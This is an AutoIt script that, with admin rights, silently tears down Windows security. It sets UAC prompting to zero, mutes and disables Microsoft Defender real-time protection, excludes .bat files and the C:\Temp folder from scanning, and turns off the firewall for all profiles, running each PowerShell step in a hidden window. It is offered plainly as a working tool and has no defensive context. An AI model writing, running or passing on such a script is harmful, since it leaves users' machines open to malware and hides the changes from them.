#RequireAdmin

;disable UAC
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System", "ConsentPromptBehaviorAdmin", "REG_DWORD", 0)

;disable Defender notifications
RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter", "Enabled", "REG_DWORD", 0)

;Win Defender powershell documentation:
;https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2022-ps

;disable Win Defender
;RunWait('powershell.exe start-process powershell -verb runas -command "pwd;Set-MpPreference -DisableRealtimeMonitoring $true "')
ShellExecuteWait('powershell.exe','Set-MpPreference -DisableRealtimeMonitoring $true', "", default, @SW_HIDE);disable protaction
ShellExecuteWait('powershell.exe','Add-MpPreference -ExclusionExtension ".bat"', "", default, @SW_HIDE);file format add to exclusion list
ShellExecuteWait('powershell.exe','Add-MpPreference -ExclusionPath "C:\Temp"', "", default, @SW_HIDE);folder add to exclusion list
ShellExecuteWait('powershell.exe','netsh advfirewall set allprofiles state off', "", default, @SW_HIDE);kill firewall

MsgBox(0,'','done')